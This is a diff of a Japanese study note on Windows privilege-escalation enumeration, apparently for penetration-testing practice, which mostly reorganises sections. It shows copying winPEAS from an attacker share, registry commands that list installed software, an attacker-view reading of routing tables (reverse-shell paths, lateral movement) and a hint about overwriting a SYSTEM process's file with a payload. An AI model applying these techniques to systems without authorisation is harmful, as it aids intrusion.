@@ -74,7 +74,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 	- `Desktop`：RDP接続でGUIアクセスが可能
 	- `Management`：WinRM（遠隔PowerShell）が可能
 	- ※`Administrators`グループなら両方可能
-- [[#管理者のアカウント運用について]]
+- 補足：[[#管理者のアカウント運用について]]
 
 ## ユーザー情報・ホスト名の列挙コマンド
 
@@ -215,75 +215,7 @@ Active Connections
 - State LISTINING：そのポートで何かのサービスが動作している
 - State ESTABLISHED：現在使用中
 - ポート番号から、動作しているサービスを推測できる→[[#実行中のプロセスの列挙]]で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定
-
-### 補足：ルーティングテーブルの見方
-
-![[Pasted image 20250724124100.png]]
-$$ルーティングテーブルの例$$
-
-#### セクション一覧
-
-| セクション名           | 内容                          |
-| ---------------- | --------------------------- |
-| Interface List   | ネットワークインターフェースの一覧（番号、MACなど） |
-| IPv4 Route Table | IPv4のルーティングテーブル（アクティブ・永続）   |
-| IPv6 Route Table | IPv6のルーティングテーブル（アクティブ・永続）   |
-
-#### Interface List
-
-```nginx
-Interface List
-  4...00 50 56 ab ee 51 ......vmxnet3 Ethernet Adapter
-  1...........................Software Loopback Interface 1
-```
-
-| 項目         | 意味                                        |
-| ---------- | ----------------------------------------- |
-| インターフェース番号 | `route print` の他セクションで参照される識別子            |
-| MACアドレス    | OUIから製品ベンダ・仮想環境（VMware, Hyper-Vなど）の特定に使える |
-| アダプタ名      | 利用中のドライバや仮想NICの識別（例：vmxnet3）              |
-
-#### IPv4 Route Table > Active Routes
-
-```nginx
-Active Routes:
-Network Destination        Netmask          Gateway       Interface  Metric
-0.0.0.0                    0.0.0.0          192.168.215.254  192.168.215.220  16
-```
-
-| 項目                  | 意味                                                                                                   |
-| ------------------- | ---------------------------------------------------------------------------------------------------- |
-| Network Destination | 宛先ネットワークアドレス                                                                                         |
-| Netmask             | サブネットマスク                                                                                             |
-| Gateway             | 宛先に届かない場合の転送先（On-linkの場合は直結）                                                                         |
-| Interface           | 出力インターフェースのIPアドレス                                                                                    |
-| Metric              | 優先度。値が小さいほど優先的に使用されるルート<br>（まずNetwork Destinationが一致するものを探す。次に同じNetmaskで複数のルートがあった場合のみ、Metricの比較を行う） |
-
-`0.0.0.0`はデフォルトルートで、どのルートにも一致しないパケットが向かう**最後**の手段の経路（`0.0.0.0`＝すべてのIPv4に合致）
-
-#### IPv4 Route Table > Persistent Routes
-
-```nginx
-Persistent Routes:
-  Network Address      Netmask        Gateway Address    Metric
-  0.0.0.0              0.0.0.0        192.168.215.254    1
-```
-
-| 項目                | 意味                  |
-| ----------------- | ------------------- |
-| Persistent Routes | 再起動しても保持されるルート      |
-| Gateway Address   | 常時使用されるゲートウェイ       |
-| Metric            | 通常のルートよりも優先されることがある |
-
-#### 攻撃者視点での注目ポイント
-
-| チェック項目                    | 内容                           | 利用方法（攻撃者目線）                      |
-| ------------------------- | ---------------------------- | -------------------------------- |
-| デフォルトルートの存在               | 0.0.0.0/0 → ゲートウェイ経由で外部通信が可能 | インターネットへ出られる＝リバースシェル可能性あり        |
-| 複数ネットワークセグメントへのルート        | 例：10.0.0.0/8、172.16.0.0/12など | 横展開や内部ネットワーク探索への足がかり             |
-| On-link セグメントの一覧          | 直接通信可能なネットワーク                | 近隣ホストの発見、SMB/RPC/NetBIOSなどの列挙に利用 |
-| Interface List の仮想NICやMAC | VMware, VirtualBox などの仮想環境識別 | 分析環境回避、ターゲットの実環境か調査              |
-| Persistent Routes の存在     | 永続的なルーティング設定（業務で必要な通信）       | 通信先の優先ネットワーク、VPNやバックアップ回線などの手がかり |
+- 補足：[[#ルーティングテーブルの見方]]
 
 ---
 
@@ -297,8 +229,6 @@ Persistent Routes:
 ## インストール済みアプリケーションの列挙コマンド
 
 インストール済みアプリケーションの列挙（可視性高）
-	([[用語#レジストリのHKCU、HKLMの違い]])
-	([[#補足：インストール済みアプリ列挙コマンド詳細]])
 ```powershell
 # Access deninedのときは、reg query "HKLM\..."
 $paths = @(
@@ -326,18 +256,8 @@ dir "C:\Program Files (x86)"
 dir ~\Downloads
 ```
 
-### 補足：インストール済みアプリ列挙コマンド詳細
-
-```powershell
-# 64ビット版Windowsで動作する32bitアプリ
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion
-
-# 64bitアプリ（全ユーザー）
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion
-
-# 現在ログオン中のユーザーだけにインストールされたアプリ
-Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
-```
+- 補足：[[#インストール済みアプリ列挙コマンド詳細]]
+- [[用語#レジストリのHKCU、HKLMの違い]]
 
 ---
 
@@ -389,6 +309,10 @@ ps <search_word> -ErrorAction SilentlyContinue | Watch-Command -Difference -Cont
 	- 0： システムサービス、バックグラウンドプロセスが実行される特別なセッションであり、**高権限の可能性が高い**
 	- 1：最初のユーザーログオンセッションであり、一般ユーザーのプロセスが実行される
 	- 2以降：追加のユーザーログオンセッション
+
+>[!TIPS]
+>
+
 - 💡サービス、スケジュールタスクで編集可能なファイルが実行されていない場合は、プロセスを疑う
 	- →💥プロセスのSIが「0」、かつファイルをペイロードで上書きできれば、権限昇格につながる可能性がある
 
@@ -606,8 +530,9 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewa
 - [ ] 
 
 ---
+---
 
-# 補足
+# 補足事項まとめ
 
 ## 管理者のアカウント運用について
 
@@ -615,6 +540,93 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewa
 - 非特権アカウントは通常業務、特権アカウントは管理業務
 - 特権アカウントでリスクのあるタスク（インターネットアクセス等）はしない
 
+---
+
+## ルーティングテーブルの見方
+
+![[Pasted image 20250724124100.png]]
+$$ルーティングテーブルの例$$
+
+### セクション一覧
+
+| セクション名           | 内容                          |
+| ---------------- | --------------------------- |
+| Interface List   | ネットワークインターフェースの一覧（番号、MACなど） |
+| IPv4 Route Table | IPv4のルーティングテーブル（アクティブ・永続）   |
+| IPv6 Route Table | IPv6のルーティングテーブル（アクティブ・永続）   |
+
+### Interface List
+
+```nginx
+Interface List
+  4...00 50 56 ab ee 51 ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+```
+
+| 項目         | 意味                                        |
+| ---------- | ----------------------------------------- |
+| インターフェース番号 | `route print` の他セクションで参照される識別子            |
+| MACアドレス    | OUIから製品ベンダ・仮想環境（VMware, Hyper-Vなど）の特定に使える |
+| アダプタ名      | 利用中のドライバや仮想NICの識別（例：vmxnet3）              |
+
+### IPv4 Route Table > Active Routes
+
+```nginx
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+0.0.0.0                    0.0.0.0          192.168.215.254  192.168.215.220  16
+```
+
+| 項目                  | 意味                                                                                                   |
+| ------------------- | ---------------------------------------------------------------------------------------------------- |
+| Network Destination | 宛先ネットワークアドレス                                                                                         |
+| Netmask             | サブネットマスク                                                                                             |
+| Gateway             | 宛先に届かない場合の転送先（On-linkの場合は直結）                                                                         |
+| Interface           | 出力インターフェースのIPアドレス                                                                                    |
+| Metric              | 優先度。値が小さいほど優先的に使用されるルート<br>（まずNetwork Destinationが一致するものを探す。次に同じNetmaskで複数のルートがあった場合のみ、Metricの比較を行う） |
+
+`0.0.0.0`はデフォルトルートで、どのルートにも一致しないパケットが向かう**最後**の手段の経路（`0.0.0.0`＝すべてのIPv4に合致）
+
+### IPv4 Route Table > Persistent Routes
+
+```nginx
+Persistent Routes:
+  Network Address      Netmask        Gateway Address    Metric
+  0.0.0.0              0.0.0.0        192.168.215.254    1
+```
+
+| 項目                | 意味                  |
+| ----------------- | ------------------- |
+| Persistent Routes | 再起動しても保持されるルート      |
+| Gateway Address   | 常時使用されるゲートウェイ       |
+| Metric            | 通常のルートよりも優先されることがある |
+
+### 攻撃者視点での注目ポイント
+
+| チェック項目                    | 内容                           | 利用方法（攻撃者目線）                      |
+| ------------------------- | ---------------------------- | -------------------------------- |
+| デフォルトルートの存在               | 0.0.0.0/0 → ゲートウェイ経由で外部通信が可能 | インターネットへ出られる＝リバースシェル可能性あり        |
+| 複数ネットワークセグメントへのルート        | 例：10.0.0.0/8、172.16.0.0/12など | 横展開や内部ネットワーク探索への足がかり             |
+| On-link セグメントの一覧          | 直接通信可能なネットワーク                | 近隣ホストの発見、SMB/RPC/NetBIOSなどの列挙に利用 |
+| Interface List の仮想NICやMAC | VMware, VirtualBox などの仮想環境識別 | 分析環境回避、ターゲットの実環境か調査              |
+| Persistent Routes の存在     | 永続的なルーティング設定（業務で必要な通信）       | 通信先の優先ネットワーク、VPNやバックアップ回線などの手がかり |
+
+---
+
+## インストール済みアプリ列挙コマンド詳細
+
+```powershell
+# 64ビット版Windowsで動作する32bitアプリ
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion
+
+# 64bitアプリ（全ユーザー）
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion
+
+# 現在ログオン中のユーザーだけにインストールされたアプリ
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
+```
+
+---
 
 ## WinPEAS結果の見方
 
